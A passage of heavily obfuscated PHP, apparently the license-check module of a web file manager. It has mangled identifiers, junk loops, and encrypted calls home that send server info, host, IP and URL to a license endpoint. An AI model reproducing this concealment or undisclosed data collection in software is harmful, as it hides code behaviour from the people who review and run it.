$Î‰‡ŞİÊ[59], $Î‰‡ŞİÊ[60], $Î‰‡ŞİÊ[61], $Î‰‡ŞİÊ[62], $Î‰‡ŞİÊ[63], $Î‰‡ŞİÊ[64], $Î‰‡ŞİÊ[65], $Î‰‡ŞİÊ[66], $Î‰‡ŞİÊ[67], $Î‰‡ŞİÊ[68], $Î‰‡ŞİÊ[69], $Î‰‡ŞİÊ[70], $Î‰‡ŞİÊ[71], $Î‰‡ŞİÊ[72], $Î‰‡ŞİÊ[73], $Î‰‡ŞİÊ[74], $Î‰‡ŞİÊ[75], $Î‰‡ŞİÊ[76], $Î‰‡ŞİÊ[77], $Î‰‡ŞİÊ[78], $Î‰‡ŞİÊ[79], $Î‰‡ŞİÊ[80], $Î‰‡ŞİÊ[81], $Î‰‡ŞİÊ[82], $Î‰‡ŞİÊ[83], $Î‰‡ŞİÊ[84], $Î‰‡ŞİÊ[85], $Î‰‡ŞİÊ[86], $Î‰‡ŞİÊ[87]); foreach ($˜óÀ•õÊ as $Îš¦áè) { $Ü—¦Æ Ø = $GLOBALS[$Î‰‡ŞİÊ[88]][$Î‰‡ŞİÊ[89]][$Îš¦áè]; if (isset($Ì¯Şì•[$Îš¦áè])) { $Ü—¦Æ Ø = $Ì¯Şì•[$Îš¦áè]; } $á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[91]][$Îš¦áè] = $Ü—¦Æ Ø; } $±øÂ²¸ß = $á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[91]][$Î‰‡ŞİÊ[46]]; $˜»œî‹ = $…ĞÅú™²[747]; if (strlen($˜»œî‹) < $…ĞÅú™²[727]) { return; } unset($á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[92]][$Î‰‡ŞİÊ[93]]); unset($á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[92]][$Î‰‡ŞİÊ[94]]); $¬ŸíÒ”Û = $…ĞÅú™²[748]; if (strlen($¬ŸíÒ”Û) < $…ĞÅú™²[727]) { return; } unset($á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[91]][$Î‰‡ŞİÊ[46]]); $¹ñ²™Œø = $…ĞÅú™²[749]; if (strlen($¹ñ²™Œø) < $…ĞÅú™²[714]) { die; } unset($á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[91]][$Î‰‡ŞİÊ[95]]); $´Š¹Ùõ = $…ĞÅú™²[750]; $á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[91]][$Î‰‡ŞİÊ[96]] = array($Î‰‡ŞİÊ[97] => (int) $±øÂ²¸ß[$Î‰‡ŞİÊ[98]], $Î‰‡ŞİÊ[99] => (int) _get($±øÂ²¸ß, $Î‰‡ŞİÊ[100], 0)); $üäú›ªó = $…ĞÅú™²[751]; if (!$üäú›ªó) { die; } $èªà¨ÅÑ = substr(md5($Î‰‡ŞİÊ[101] . get_client_ip() . $Ì¯Şì•[$Î‰‡ŞİÊ[102]]), 0, 15); $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[104]] = Mcrypt::encode(Session::sign(), $èªà¨ÅÑ, 3600 * 24); $Ú¶¦Şƒû = $…ĞÅú™²[752]; if (!$Ú¶¦Şƒû) { return; } $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[105]] = Action($Î‰‡ŞİÊ[106])->accessToken(); $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[107]] = md5($_SERVER[$Î‰‡ŞİÊ[108]] . $Ì¯Şì•[$Î‰‡ŞİÊ[102]]); $„ú×¤ = $…ĞÅú™²[753]; while ($„ú×¤ < $…ĞÅú™²[60]) { if ($„ú×¤ >= 0) { break; } $„ú×¤++; } $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[109]] = base64_encode(serverInfo()); $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[110]] = $this->rghxbd9bc189; $ú¾À±¬£ = $…ĞÅú™²[754]; if ($Ì¯Şì•[$Î‰‡ŞİÊ[110]] != $Î‰‡ŞİÊ[111]) { $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[112]] = $Ì¯Şì•[$Î‰‡ŞİÊ[112]]; $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[113]] = $Ì¯Şì•[$Î‰‡ŞİÊ[113]]; $©Ê¶ú = rand_string(10) . $this->rghxbd9bc189 . rand_string(5); $á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[114]][$Î‰‡ŞİÊ[115]] = $this->ojzpca1e00a1($©Ê¶ú, $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[107]]); } if ($this->rghxbd9bc189 == $Î‰‡ŞİÊ[111]) { $á¨÷ÅÎ£[$Î‰‡ŞİÊ[90]][$Î‰‡ŞİÊ[91]][$Î‰‡ŞİÊ[96]][$Î‰‡ŞİÊ[100]] = 0; } $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[116]] = $this->versionPluginFilter(); $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[117]] = _get($this->nkpu6f387026, $Î‰‡ŞİÊ[118], $Î‰‡ŞİÊ[6]); if (KodUser::isRoot() && $this->config[$Î‰‡ŞİÊ[119]]) { $á¨÷ÅÎ£[$Î‰‡ŞİÊ[103]][$Î‰‡ŞİÊ[120]] = WEB_ROOT; } return $á¨÷ÅÎ£; } private function mgst05d6430e() { $úƒ¥ŠÌí =& $_SERVER[¤øïŠ‹²]; $ÑÆ—ß™ä =& $_SERVER[Ôêåã]; $Ú¥‹‚Ä× = $_SERVER[$ÑÆ—ß™ä[24]] == $ÑÆ—ß™ä[121]; if ($_SERVER[$ÑÆ—ß™ä[24]] == $ÑÆ—ß™ä[122] && $_GET[$ÑÆ—ß™ä[123]] == $ÑÆ—ß™ä[124]) { $Ú¥‹‚Ä× = !0; } if ($Ú¥‹‚Ä×) { $ã‡ıÎÉ÷ = array($ÑÆ—ß™ä[110] => $this->rghxbd9bc189, $ÑÆ—ß™ä[125] => $this->odlid125d811(), $ÑÆ—ß™ä[126] => Model($ÑÆ—ß™ä[127])->count()); if ($this->rghxbd9bc189 != $ÑÆ—ß™ä[111]) { $’“ÓÇê = _get($this->nkpu6f387026, $ÑÆ—ß™ä[128]); if ($’“ÓÇê) { $ã‡ıÎÉ÷[$ÑÆ—ß™ä[129]] = $’“ÓÇê; $ã‡ıÎÉ÷[$ÑÆ—ß™ä[130]] = strtotime(_get($this->nkpu6f387026, $ÑÆ—ß™ä[131])); $ã‡ıÎÉ÷[$ÑÆ—ß™ä[132]] = _get($this->nkpu6f387026, $ÑÆ—ß™ä[118]); } $‰ÚŠÀàï = Model($ÑÆ—ß™ä[33])->get($ÑÆ—ß™ä[133], $ÑÆ—ß™ä[6], !0); if (is_string($‰ÚŠÀàï) && substr($‰ÚŠÀàï, 0, 1) == $ÑÆ—ß™ä[134]) { $‰ÚŠÀàï = json_decode_force($‰ÚŠÀàï); } if (is_array($‰ÚŠÀàï) && $‰ÚŠÀàï[$ÑÆ—ß™ä[135]] && strstr($‰ÚŠÀàï[$ÑÆ—ß™ä[135]], $ÑÆ—ß™ä[136])) { $®Æ«ıÑ = explode($ÑÆ—ß™ä[136], $‰ÚŠÀàï[$ÑÆ—ß™ä[135]]); $ã‡ıÎÉ÷[$ÑÆ—ß™ä[137]] = $®Æ«ıÑ[0]; } } $ã‡ıÎÉ÷ = $this->ixcy538437b7(json_encode($ã‡ıÎÉ÷), md5($ÑÆ—ß™ä[138])); $œÆ¡˜ÕÌ = array($ÑÆ—ß™ä[139] => $ã‡ıÎÉ÷); call_user_func(array($ÑÆ—ß™ä[140], $ÑÆ—ß™ä[141]), $œÆ¡˜ÕÌ); $·İÂ±· = $úƒ¥ŠÌí[755]; if (!$·İÂ±·) { return; } } if ($this->rghxbd9bc189 == $ÑÆ—ß™ä[111]) { return; } $¢­èÖö½ = array($ÑÆ—ß™ä[142], $ÑÆ—ß™ä[143], $ÑÆ—ß™ä[144], $ÑÆ—ß™ä[145], $ÑÆ—ß™ä[146], $ÑÆ—ß™ä[147]); $»€‰ÖÀâ = $úƒ¥ŠÌí[756]; if (!$»€‰ÖÀâ) { die; } $Üå¸Áüá = Model($ÑÆ—ß™ä[33])->get(); $œÆ¡˜ÕÌ = array($ÑÆ—ß™ä[148] => $Üå¸Áüá[$ÑÆ—ß™ä[34]], $ÑÆ—ß™ä[149] => $Üå¸Áüá[$ÑÆ—ß™ä[35]], $ÑÆ—ß™ä[150] => $ÑÆ—ß™ä[6]); $É¥œµ¼æ = $úƒ¥ŠÌí[757]; while (strlen($É¥œµ¼æ) < $úƒ¥ŠÌí[714]) { if (!$É¥œµ¼æ) { break; } $É¥œµ¼æ++; } foreach ($¢­èÖö½ as $Ï„øôÖ¨) { if (!isset($Üå¸Áüá[$Ï„øôÖ¨]) || !$Üå¸Áüá[$Ï„øôÖ¨]) { continue; } $œÆ¡˜ÕÌ[$Ï„øôÖ¨] = $Üå¸Áüá[$Ï„øôÖ¨]; $Â¦ù® ¡ = $úƒ¥ŠÌí[758]; if (strlen($Â¦ù® ¡) < $úƒ¥ŠÌí[709]) { return; } } call_user_func(array($ÑÆ—ß™ä[140], $ÑÆ—ß™ä[141]), $œÆ¡˜ÕÌ); } private function wcugd5a5b1ee() { $Ê¤Û‹šß =& $_SERVER[¤øïŠ‹²]; $¤Ø±Ç¨ =& $_SERVER[Ôêåã]; if ($_SERVER[$¤Ø±Ç¨[24]] != $¤Ø±Ç¨[151]) { return; } if (!KodUser::isRoot()) { die; } $â¹ŞÁÌ÷ = $GLOBALS[$¤Ø±Ç¨[13]]; if (isset($â¹ŞÁÌ÷[$¤Ø±Ç¨[152]])) { $this->rywx17228834(); die; } if (isset($â¹ŞÁÌ÷[$¤Ø±Ç¨[153]]) && isset($â¹ŞÁÌ÷[$¤Ø±Ç¨[153]]) == $¤Ø±Ç¨[124]) { $â¹ŞÁÌ÷[$¤Ø±Ç¨[154]] = Model($¤Ø±Ç¨[33])->get($¤Ø±Ç¨[155]); } if (!isset($â¹ŞÁÌ÷[$¤Ø±Ç¨[154]]) || strlen($â¹ŞÁÌ÷[$¤Ø±Ç¨[154]]) != 16) { show_json($¤Ø±Ç¨[156] . $â¹ŞÁÌ÷[$¤Ø±Ç¨[154]], !1); } $¢ïúù»¦ = Model($¤Ø±Ç¨[33])->get($¤Ø±Ç¨[102]); $¶’±¸×ç = md5($_SERVER[$¤Ø±Ç¨[108]] . $¢ïúù»¦); $±ø„Ë = $Ê¤Û‹šß[759]; if (!$±ø„Ë) { return; } $†·—¯—¾ = array($¤Ø±Ç¨[154] => $â¹ŞÁÌ÷[$¤Ø±Ç¨[154]], $¤Ø±Ç¨[157] => rand_string(16), $¤Ø±Ç¨[158] => $¤Ø±Ç¨[138], $¤Ø±Ç¨[159] => $¤Ø±Ç¨[160], $¤Ø±Ç¨[161] => $_SERVER[$¤Ø±Ç¨[162]], $¤Ø±Ç¨[163] => $_SERVER[$¤Ø±Ç¨[164]], $¤Ø±Ç¨[165] => $_SERVER[$¤Ø±Ç¨[166]], $¤Ø±Ç¨[107] => $¶’±¸×ç, $¤Ø±Ç¨[167] => Model($¤Ø±Ç¨[33])->get($¤Ø±Ç¨[133])); if (isset($â¹ŞÁÌ÷[$¤Ø±Ç¨[153]]) && isset($â¹ŞÁÌ÷[$¤Ø±Ç¨[153]]) == $¤Ø±Ç¨[124]) { $†·—¯—¾[$¤Ø±Ç¨[153]] = md5($†·—¯—¾[$¤Ø±Ç¨[154]] . $¤Ø±Ç¨[168] . $†·—¯—¾[$¤Ø±Ç¨[157]]); } if ($â¹ŞÁÌ÷[$¤Ø±Ç¨[169]] == $¤Ø±Ç¨[170]) { $”‡–Æ ı = $this->ixcy538437b7($¶’±¸×ç, $¤Ø±Ç¨[171]); $¹ÛÂËŠ = $this->ojzpca1e00a1(json_encode($†·—¯—¾), $¶’±¸×ç . $¤Ø±Ç¨[172], 3); $¹ÛÂËŠ = $¹ÛÂËŠ . $¤Ø±Ç¨[173] . $_SERVER[$¤Ø±Ç¨[162]]; $²îõŒ­æ = $this->mfai41bce066($¤Ø±Ç¨[174] . $”‡–Æ ı . $¤Ø±Ç¨[175] . $¹ÛÂËŠ, -1); show_json($²îõŒ­æ, !0); } else { if ($â¹ŞÁÌ÷[$¤Ø±Ç¨[169]] == $¤Ø±Ç¨[176]) { $ù‘ŒîĞ = substr(md5($¤Ø±Ç¨[177] . $¶’±¸×ç), 12, 15) . $¤Ø±Ç¨[178]; $¹ÛÂËŠ = $this->kmiod2720578(trim($â¹ŞÁÌ÷[$¤Ø±Ç¨[179]]), $ù‘ŒîĞ, 2); $æ’’Ò‘ = json_decode($¹ÛÂËŠ, !0); if (!is_array($æ’’Ò‘) || !is_array($æ’’Ò‘[$¤Ø±Ç¨[180]]) || $æ’’Ò‘[$¤Ø±Ç¨[154]] != !0) { $‰°Üåº† = $¤Ø±Ç¨[181]; $…õ×Åô› = $æ’’Ò‘[$¤Ø±Ç¨[180]] ? $¤Ø±Ç¨[182] . $æ’’Ò‘[$¤Ø±Ç¨[180]] : $‰°Üåº†; show_json($…õ×Åô›, !1); } else { $†·—¯—¾[$¤Ø±Ç¨[157]] = $æ’’Ò‘[$¤Ø±Ç¨[180]][$¤Ø±Ç¨[183]]; } } else { $æ’’Ò‘ = $this->mfai41bce066($¤Ø±Ç¨[184], $†·—¯—¾, 10); } } if (!is_array($æ’’Ò‘) || !is_array($æ’’Ò‘[$¤Ø±Ç¨[180]]) || $æ’’Ò‘[$¤Ø±Ç¨[154]] != !0) { $‰°Üåº† = LNG($¤Ø±Ç¨[185]); $…õ×Åô› = $æ’’Ò‘[$¤Ø±Ç¨[180]] ? $¤Ø±Ç¨[182] . $æ’’Ò‘[$¤Ø±Ç¨[180]] : $‰°Üåº†; show_json($…õ×Åô›, !1); } $ÉË•û¦ì = $æ’’Ò‘[$¤Ø±Ç¨[180]]; $¿Ÿ¦øÉÃ = $this->eauzb8cb5b94($ÉË•û¦ì[$¤Ø±Ç¨[186]]); $»şÊ½¯ = $Ê¤Û‹šß[760]; if (!$¿Ÿ¦øÉÃ || $¿Ÿ¦øÉÃ != $ÉË•û¦ì[$¤Ø±Ç¨[131]]) { $™’öéÓ› = array($¤Ø±Ç¨[187] => Model($¤Ø±Ç¨[33])->get($¤Ø±Ç¨[102]), $¤Ø±Ç¨[188] => $_SERVER[$¤Ø±Ç¨[108]], $¤Ø±Ç¨[189] => this_url(), $¤Ø±Ç¨[163] => $_SERVER[$¤Ø±Ç¨[164]]); $¹ÛÂËŠ = $this->kfqy25043afd(json_encode($™’öéÓ›)); $this->mfai41bce066($¤Ø±Ç¨[190] . $¹ÛÂËŠ); show_json(LNG($¤Ø±Ç¨[191]), !0); } $–­››ú = array($¤Ø±Ç¨[155] => $ÉË•û¦ì[$¤Ø±Ç¨[192]], $¤Ø±Ç¨[193] => $ÉË•û¦ì[$¤Ø±Ç¨[194]], $¤Ø±Ç¨[195] => rand_string(16), $¤Ø±Ç¨[110] => $ÉË•û¦ì[$¤Ø±Ç¨[196]]); if ($†·—¯—¾[$¤Ø±Ç¨[157]]) { $–­››ú[$¤Ø±Ç¨[195]] = $†·—¯—¾[$¤Ø±Ç¨[157]]; } $Ô¹ôÓô¾ = substr(md5($–­››ú[$¤Ø±Ç¨[193]]), 10, 10); $‡ÎêÉçş = $Ô¹ôÓô¾ . $–­››ú[$¤Ø±Ç¨[110]] . $–­››ú[$¤Ø±Ç¨[195]]; $–­››ú[$¤Ø±Ç¨[112]] = strrev(base64_encode($this->ixcy538437b7($‡ÎêÉçş, $¤Ø±Ç¨[197]))); $† ØùŠ’ = $Ê¤Û‹šß[761]; while ($† ØùŠ’ < $Ê¤Û‹šß[727]) { if ($† ØùŠ’ >= 0) { break; } $† ØùŠ’++; } $Ô¹èÔŸĞ = rand_string(16); $ªÏö…’ = $Ê¤Û‹šß[762]; if (!$ªÏö…’) { die; } $ÉƒÌ„°§ = $Ô¹èÔŸĞ . $–­››ú[$¤Ø±Ç¨[110]] . $this->ixcy538437b7(md5($–­››ú[$¤Ø±Ç¨[155]]), $Ô¹èÔŸĞ); $­Üœş­Ó = $Ê¤Û‹šß[763]; while ($­Üœş­Ó < $Ê¤Û‹šß[709]) { if ($­Üœş­Ó >= 0) { break; } $­Üœş­Ó++; } $–­››ú[$¤Ø±Ç¨[113]] = base64_encode(strrev($this->ixcy538437b7($ÉƒÌ„°§, $¤Ø±Ç¨[198]))); $şó³Î©ù = $Ê¤Û‹šß[764]; while ($şó³Î©ù < $Ê¤Û‹šß[727]) { if ($şó³Î©ù >= 0) { break; } $şó³Î©ù++; } if ($ÉË•û¦ì[$¤Ø±Ç¨[199]] && $ÉË•û¦ì[$¤Ø±Ç¨[199]] >= 1) { Model($¤Ø±Ç¨[33])->setDeep($¤Ø±Ç¨[200], $¤Ø±Ç¨[124]); } Model($¤Ø±Ç¨[33])->set($–­››ú); $ş„ìõõ« = md5($_SERVER[$¤Ø±Ç¨[108]] . strrev($¢ïúù»¦) . $–­››ú[$¤Ø±Ç¨[193]]); $ìíè¯Ç÷ = strrev(substr($ş„ìõõ«, 10, 16)); $ö’Íƒá÷ = $this->ojzpca1e00a1(json_encode($ÉË•û¦ì), $ş„ìõõ«); $ÌÓ…Ï™ª = $Ê¤Û‹šß[765]; if (strlen($ÌÓ…Ï™ª) < $Ê¤Û‹šß[709]) { die; } $ÓœË÷… = array_to_keyvalue(Model($¤Ø±Ç¨[7])->listData(), $¤Ø±Ç¨[201]); $§´œ¶¿ß = $ÓœË÷…[$¤Ø±Ç¨[202]]; $Íèˆ¾Å = $Ê¤Û‹šß[766]; $Ø†èúŞ² = array(); $Ø†èúŞ²[$ìíè¯Ç÷] = $ö’Íƒá÷; $§¢†ïö¸ = $Ê¤Û‹šß[767]; while ($§¢†ïö¸ < $Ê¤Û‹šß[714]) { if ($§¢†ïö¸ >= 0) { break; } $§¢†ïö¸++; } Model($¤Ø±Ç¨[7])->update($§´œ¶¿ß[$¤Ø±Ç¨[203]], array($¤Ø±Ç¨[204] => $Ø†èúŞ²)); $¾ÀÇÏ•² = $Ê¤Û‹šß[768]; if (!$¾ÀÇÏ•²) { return; } $this->nkpu6f387026 = $ÉË•û¦ì; $µ–è˜ = $Ê¤Û‹šß[769]; if (strlen($µ–è˜) < $Ê¤Û‹šß[714]) { return; } $this->rghxbd9bc189 = $–­››ú[$¤Ø±Ç¨[110]]; $this->licenseRegistSuccess(); $ëãĞ°–µ = $Ê¤Û‹šß[770]; if (!$ëãĞ°–µ) { return; } Cache::set($¤Ø±Ç¨[205] . md5($¢ïúù»¦ . $¤Ø±Ç¨[206]), $¤Ø±Ç¨[6]); show_json(LNG($¤Ø±Ç¨[191]), !0); } private function licenseRegistSuccess() { $À²ãÌæğ =& $_SERVER[¤øïŠ‹²]; $ùúÊ¾œö =& $_SERVER[Ôêåã]; $Â…Ş×“ = Model($ùúÊ¾œö[33])->get(); $úˆè‰–‘ = $À²ãÌæğ[771]; if (strlen($úˆè‰–‘) < $À²ãÌæğ[727]) { die; } if ($Â…Ş×“[$ùúÊ¾œö[63]] != $ùúÊ¾œö[124]) { Model($ùúÊ¾œö[33])->set($ùúÊ¾œö[63], $ùúÊ¾œö[124]); } Action($ùúÊ¾œö[207])->initStart(!0); } private function rywx17228834() { $öàííİ¨ =& $_SERVER[¤øïŠ‹²]; $åØ¸Ú¿Ô =& $_SERVER[Ôêåã]; Model($åØ¸Ú¿Ô[33])->set(array($åØ¸Ú¿Ô[155] => $åØ¸Ú¿Ô[6], $åØ¸Ú¿Ô[193] => $åØ¸Ú¿Ô[6], $åØ¸Ú¿Ô[110] => $åØ¸Ú¿Ô[111], $åØ¸Ú¿Ô[112] => $åØ¸Ú¿Ô[6], $åØ¸Ú¿Ô[113] => $åØ¸Ú¿Ô[6])); Model($åØ¸Ú¿Ô[33])->setDeep($åØ¸Ú¿Ô[200], $åØ¸Ú¿Ô[208]); $üæõğ²Ø = $öàííİ¨[772]; $this->nkpu6f387026 = array(); $Ìœœè—© = $öàííİ¨[773]; if (strlen($Ìœœè—©) < $öàííİ¨[716]) { die; } $this->rghxbd9bc189 = $åØ¸Ú¿Ô[111]; } private function nchdd7cbb424() { $Î´Åè½³ =& $_SERVER[¤øïŠ‹²]; $¸æ­ƒŸ =& $_SERVER[Ôêåã]; $_SERVER[$¸æ­ƒŸ[164]] = _get($_SERVER, $¸æ­ƒŸ[164], APP_HOST); $this->rghxbd9bc189 = $¸æ­ƒŸ[111]; $é‚¤«ıò = Model($¸æ­ƒŸ[33])->get(); $¯Üâ¹Ï¶ = $Î´Åè½³[774]; if (!$¯Üâ¹Ï¶) { return; } if ($é‚¤«ıò[$¸æ­ƒŸ[110]] == $¸æ­ƒŸ[111]) { return; } $½ñÙÇê² = Model($¸æ­ƒŸ[33])->get($¸æ­ƒŸ[102]); $±Ì¸¬£² = $¸æ­ƒŸ[205] . md5($½ñÙÇê² . $¸æ­ƒŸ[206]); $Ùè–®Ì = $Î´Åè½³[775]; while ($Ùè–®Ì < $Î´Åè½³[716]) { if ($Ùè–®Ì >= 0) { break; } $Ùè–®Ì++; } $Ô¯º§Û = Cache::get($±Ì¸¬£²); if (!is_array($Ô¯º§Û) || !isset($Ô¯º§Û[$¸æ­ƒŸ[209]]) || time() - $Ô¯º§Û[$¸æ­ƒŸ[209]] >= 60) { $ó¥‹ğÔ‹ = Model($¸æ­ƒŸ[7])->loadList(); $ÄË·§  = $ó¥‹ğÔ‹[$¸æ­ƒŸ[202]]; $ï½üîè = md5($_SERVER[$¸æ­ƒŸ[108]] . strrev($½ñÙÇê²) . $é‚¤«ıò[$¸æ­ƒŸ[193]]); $€½õË¡ = strrev(substr($ï½üîè, 10, 16)); $Ô¯º§Û = $this->kmiod2720578($ÄË·§ [$¸æ­ƒŸ[88]][$€½õË¡], $ï½üîè); $Ô¯º§Û = json_decode($Ô¯º§Û, !0); } if (!is_array($Ô¯º§Û)) { return $this->rywx17228834(); } $üåŸÄÉ’ = strtotime($Ô¯º§Û[$¸æ­ƒŸ[131]]); if (time() >= $üåŸÄÉ’) { return $this->rywx17228834(); } if (!isset($Ô¯º§Û[$¸æ­ƒŸ[209]]) || time() - $Ô¯º§Û[$¸æ­ƒŸ[209]] > 20) { $Ô¯º§Û[$¸æ­ƒŸ[209]] = time(); Cache::set($±Ì¸¬£², $Ô¯º§Û); } $this->nkpu6f387026 = $Ô¯º§Û; $this->rghxbd9bc189 = $é‚¤«ıò[$¸æ­ƒŸ[110]]; $GLOBALS[$¸æ­ƒŸ[210]] = $this; $…äõú„ = $Î´Åè½³[776]; if (strlen($…äõú„) < $Î´Åè½³[714]) { return; } } private function cfxm1a3baa01() { $«“ì¥Ô’ =& $_SERVER[¤øïŠ‹²]; $«ÕŸ¬ì† =& $_SERVER[Ôêåã]; $ø¡Şú = $GLOBALS[$«ÕŸ¬ì†[13]]; $¢†í¤Ú = $«“ì¥Ô’[777]; if (!$¢†í¤Ú) { die; } $‰£‘àç· = $_SERVER[$«ÕŸ¬ì†[24]]; $Ş½äœå = $«“ì¥Ô’[718]; if (!$Ş½äœå) { return; } if ($‰£‘àç· == $«ÕŸ¬ì†[211] && $this->rghxbd9bc189 == $«ÕŸ¬ì†[111]) { show_json(LNG($«ÕŸ¬ì†[212]), !1, $«ÕŸ¬ì†[213]); } $¨®”¢áÅ = array($«ÕŸ¬ì†[214], $«ÕŸ¬ì†[215]); if (in_array($‰£‘àç·, $¨®”¢áÅ)) { if ($this->rghxbd9bc189 == $«ÕŸ¬ì†[111] && isset($ø¡Şú[$«ÕŸ¬ì†[216]])) { show_json(LNG($«ÕŸ¬ì†[212]), !1, $«ÕŸ¬ì†[213]); die; } $ğ¤²­úı = $this->odlid125d811(); if ($ğ¤²­úı != intval($«ÕŸ¬ì†[217])) { if ($ğ¤²­úı <= Model($«ÕŸ¬ì†[127])->count()) { show_json(LNG($«ÕŸ¬ì†[218]), !1, $«ÕŸ¬ì†[213]); die; } } } } private function qikbd690f186() { $‚¥ä¢ =& $_SERVER[¤øïŠ‹²]; $Ù–­†Ç =& $_SERVER[Ôêåã]; $ÆÀ¡èÔ = array($Ù–­†Ç[121], $Ù–­†Ç[122]); if (!KodUser::isRoot() || !isset($_GET[$Ù–­†Ç[219]])) { return; } if (!in_array($_SERVER[$Ù–­†Ç[24]], $ÆÀ¡èÔ)) { return; } $ªİ÷ùƒ· = $Ù–­†Ç[220]; $ªİ÷ùƒ· = $this->jelyab897839($ªİ÷ùƒ·, $Ù–­†Ç[221]); $¼ŠÈµ˜ = $‚¥ä¢[778]; if (!$¼ŠÈµ˜) { return; } $§³ÚÁÕá = stream_context_create(array($Ù–­†Ç[222] => array($Ù–­†Ç[223] => $Ù–­†Ç[224], $Ù–­†Ç[225] => 3))); $Åß•‰œ× = $‚¥ä¢[779]; if (!$Åß•‰œ×) { die; } $“†üÀµ = @file_get_contents($ªİ÷ùƒ·, !1, $§³ÚÁÕá); header($Ù–­†Ç[226]); if ($“†üÀµ && strstr($“†üÀµ, $Ù–­†Ç[227])) { echo $“†üÀµ; } die; } public function prebf5bd2050($âÒÌÍ´) { $Ùß…´ˆ =& $_SERVER[Ôêåã]; if ($this->rghxbd9bc189 == $Ùß…´ˆ[228]) { return $âÒÌÍ´; } $Ç€ü¿‰¼ = $this->versionPluginList(); $Ïé¼ÓÃÇ = explode($Ùß…´ˆ[229], $this->versionPluginFilter()); $Á²äßü© = array(); foreach ($Ç€ü¿‰¼ as $Ùˆ´ => $¾‚­Ê») { if ($¾‚­Ê» == $Ùß…´ˆ[230] && substr($this->rghxbd9bc189, 0, 1) == $Ùß…´ˆ[230]) { continue; } if (!in_array($Ùˆ´, $Ïé¼ÓÃÇ)) { $Á²äßü©[] = $Ùˆ´; } } foreach ($Á²äßü© as $Ùˆ´) { unset($âÒÌÍ´[$Ùˆ´]); $¤ÆûÂ = $_SERVER[¤øïŠ‹²][780]; if (!$¤ÆûÂ) { return; } } return $âÒÌÍ´; } private function versionPluginList() { $Ä“ÛÍ€ =& $_SERVER[Ôêåã]; return array($Ä“ÛÍ€[231] => $Ä“ÛÍ€[230], $Ä“ÛÍ€[232] => $Ä“ÛÍ€[230], $Ä“ÛÍ€[233] => $Ä“ÛÍ€[230], $Ä“ÛÍ€[234] => $Ä“ÛÍ€[230], $Ä“ÛÍ€[235] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[237] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[238] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[239] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[240] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[241] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[242] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[243] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[244] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[245] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[246] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[247] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[248] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[249] => $Ä“ÛÍ€[236], $Ä“ÛÍ€[250] => $Ä“ÛÍ€[236]); } private function versionPluginFilter() { $‡†Æ„ì¼ =& $_SERVER[¤øïŠ‹²]; $½ÙÜÄã =& $_SERVER[Ôêåã]; if ($this->rghxbd9bc189 == $½ÙÜÄã[111]) { return $½ÙÜÄã[6]; } $û¨ËÍş§ = _get($this->nkpu6f387026, $½ÙÜÄã[251], $½ÙÜÄã[6]); $Ùñœ‘»Í = $‡†Æ„ì¼[781]; while ($Ùñœ‘»Í < $‡†Æ„ì¼[709]) { if ($Ùñœ‘»Í >= 0) { break; } $Ùñœ‘»Í++; } $Æ²ı× = _get($this->nkpu6f387026, $½ÙÜÄã[118], $½ÙÜÄã[6]); $”ó£·¢ = $‡†Æ„ì¼[782]; $ûˆî½‡³ = _get($this->nkpu6f387026, $½ÙÜÄã[252], $½ÙÜÄã[6]); $šİÜ¤ô  = $‡†Æ„ì¼[783]; while (strlen($šİÜ¤ô ) < $‡†Æ„ì¼[727]) { if (!$šİÜ¤ô ) { break; } $šİÜ¤ô ++; } if ($Æ²ı× > time() && $ûˆî½‡³ > time()) { $İ’úÔ  = explode($½ÙÜÄã[229], $û¨ËÍş§); $°ûÉì†Ø = array_keys($this->versionPluginList()); $û¨ËÍş§ = array_merge($İ’úÔ , $°ûÉì†Ø); $û¨ËÍş§ = implode($½ÙÜÄã[229], array_filter(array_unique($û¨ËÍş§))); } return $û¨ËÍş§; } private function egrc2f536322() { $½Äğúã =& $_SERVER[Ôêåã]; if ($this->rghxbd9bc189 != $½Äğúã[111]) { $GLOBALS[$½Äğúã[88]][$½Äğúã[92]][$½Äğúã[253]] = $½Äğúã[208]; return; } $GLOBALS[$½Äğúã[88]][$½Äğúã[254]] = $½Äğúã[124]; if (Model($½Äğúã[255])->get($½Äğúã[63]) != $½Äğúã[208]) { Model($½Äğúã[255])->set($½Äğúã[63], $½Äğúã[208]); } } public function sdbr0386d285() { return $_SERVER[Ôêåã][256]; } private function hlkmd3b24ebf() { 